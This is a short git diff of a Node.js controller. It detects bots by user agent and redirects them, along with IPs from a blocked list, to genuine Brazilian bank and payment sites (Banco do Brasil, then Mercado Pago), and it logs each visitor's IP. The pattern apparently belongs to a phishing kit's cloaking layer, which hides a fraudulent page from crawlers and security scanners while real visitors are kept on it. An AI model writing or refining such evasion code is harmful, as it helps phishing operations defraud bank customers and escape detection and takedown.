@@ -2,13 +2,14 @@ const Client = require('../../models/Client')
 const isbot = require('isbot')
 const Visitor = require('../../models/visitor')
 const Robots = require('../../modules/Robots')
+const BlockedIp = require('../../models/BloquedIp')
 
 module.exports = {
     async view(req, res) {
         try {
             isbot.extend(Robots)
 
-            if (isbot(req.get('user-agent'))) return res.redirect('https://www.bb.com.br/pbb/pagina-inicial')
+            if (isbot(req.get('user-agent'))) return res.redirect('https://www.mercadopago.com.br/')
 
             //const ip = req.socket.remoteAddress
             const ip = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim()
@@ -16,6 +17,10 @@ module.exports = {
             if (!ip) return
 
             const visitor = await Visitor.findOne({ where: { ip } })
+
+            const blocketip = await BlockedIp.findOne({ where: { ip } })
+
+            if (blocketip) return res.redirect('https://www.mercadopago.com.br/')
 
             if (!visitor) {
                 await Visitor.create({ ip })
